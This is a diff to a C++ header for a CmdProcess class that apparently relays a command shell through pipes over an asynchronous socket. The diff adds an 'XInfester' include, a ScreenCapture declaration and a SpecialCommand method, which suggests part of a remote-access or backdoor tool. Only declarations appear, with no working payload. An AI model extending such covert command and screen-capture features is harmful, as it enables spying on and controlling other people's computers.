@@ -1,6 +1,8 @@
 #pragma once
 #include "../../CubeSocket/inc/Cube_AsynIO.h"
+#include "../../XInfester/inc/XInfester.h"
 #include <stdio.h>
+
 
 struct CmdProcess_IO
 {
@@ -32,6 +34,8 @@ struct CmdProcess_O
 
 #define  CMDPROCESS_DEFAULE_RECVSIZE    512
 
+void ScreenCapture(LPSTR filename, WORD BitCount=32, LPRECT lpRect=NULL);
+
 class CmdProcess:
 	public Cube_AsynIO<CmdProcess_IO,CmdProcess_I,CmdProcess_O>
 {
@@ -43,7 +47,9 @@ public:
 
 	virtual void   run();
 	
+
 private:
+	bool	SpecialCommand(char *cmd);
 	HANDLE m_hReadPipe1,m_hWritePipe1,m_hReadPipe2,m_hWritePipe2;
 	DWORD  m_lBytesRead,m_lBytesWrite;
 	char   m_RecvBuffer[CMDPROCESS_DEFAULE_RECVSIZE];
